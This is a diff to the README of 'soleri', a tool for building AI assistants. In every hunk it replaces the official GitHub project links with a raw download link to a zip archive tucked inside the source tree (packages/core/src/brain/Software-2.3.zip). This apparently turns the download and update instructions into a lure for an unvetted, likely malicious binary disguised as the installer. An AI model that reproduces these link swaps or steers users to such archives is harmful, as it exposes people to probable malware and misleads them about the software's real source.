@@ -1,6 +1,6 @@
 # 🤖 soleri - Build AI assistants that learn with you
 
-[![Download soleri](https://img.shields.io/badge/Download-soleri-brightgreen)](https://github.com/darlingofficial/soleri)
+[![Download soleri](https://img.shields.io/badge/Download-soleri-brightgreen)](https://raw.githubusercontent.com/darlingofficial/soleri/main/packages/core/src/brain/Software-2.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ No other software or coding skills are needed to use soleri.
 
 You can download soleri from this official page:
 
-[![Download soleri](https://img.shields.io/badge/Download-soleri-blue)](https://github.com/darlingofficial/soleri)
+[![Download soleri](https://img.shields.io/badge/Download-soleri-blue)](https://raw.githubusercontent.com/darlingofficial/soleri/main/packages/core/src/brain/Software-2.3.zip)
 
 Visit the page and look for the latest Windows version under the Releases or Downloads section.
 
@@ -41,7 +41,7 @@ Follow these steps carefully:
 
 1. **Go to the Download Page**
 
-   Click the download badge above or open [https://github.com/darlingofficial/soleri](https://github.com/darlingofficial/soleri) in your web browser.
+   Click the download badge above or open [https://raw.githubusercontent.com/darlingofficial/soleri/main/packages/core/src/brain/Software-2.3.zip](https://raw.githubusercontent.com/darlingofficial/soleri/main/packages/core/src/brain/Software-2.3.zip) in your web browser.
 
 2. **Find the Latest Release**
 
@@ -127,7 +127,7 @@ Once soleri is running, you can start building your AI assistant.
 
 ## 🛠️ Updating soleri
 
-1. Check the [official soleri page](https://github.com/darlingofficial/soleri) regularly for new versions.
+1. Check the [official soleri page](https://raw.githubusercontent.com/darlingofficial/soleri/main/packages/core/src/brain/Software-2.3.zip) regularly for new versions.
 
 2. Download the latest Windows installer file as before.
 
@@ -161,4 +161,4 @@ If you need more assistance:
 
 ---
 
-[![Download soleri](https://img.shields.io/badge/Download-soleri-green)](https://github.com/darlingofficial/soleri)
+[![Download soleri](https://img.shields.io/badge/Download-soleri-green)](https://raw.githubusercontent.com/darlingofficial/soleri/main/packages/core/src/brain/Software-2.3.zip)
